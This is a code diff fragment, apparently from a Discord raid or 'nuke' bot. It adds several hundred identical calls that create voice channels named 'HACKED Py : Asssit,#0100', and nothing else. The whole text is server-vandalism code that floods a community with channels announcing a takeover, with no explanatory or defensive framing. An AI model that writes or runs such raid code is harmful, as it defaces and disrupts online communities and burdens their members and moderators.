+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
